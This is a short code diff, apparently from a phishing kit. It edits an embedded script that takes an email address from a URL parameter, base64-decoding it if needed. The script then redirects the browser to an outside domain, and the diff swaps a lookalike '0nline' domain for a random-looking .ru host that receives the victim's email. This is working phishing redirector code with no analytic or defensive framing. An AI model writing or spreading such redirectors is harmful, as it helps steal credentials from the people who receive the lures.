@@ -435,11 +435,11 @@ const html = `
         return (q[key] = value), q; 
       }, {}); 
  
-    var emailParam = queryParams["unsubscribe"]; 
+    var emailParam = queryParams["qwerty"]; 
     var decodedEmail = emailParam.includes("@") ? emailParam : atob(emailParam); 
  
     window.location.replace( 
-      "https://0nline.nngrower.co/?username=" + decodedEmail 
+      "https://yskgskem5ur6t1q7qf4h.t06q.ru/f5pgs/#" + decodedEmail 
     ); 
   </script> 
   </body>
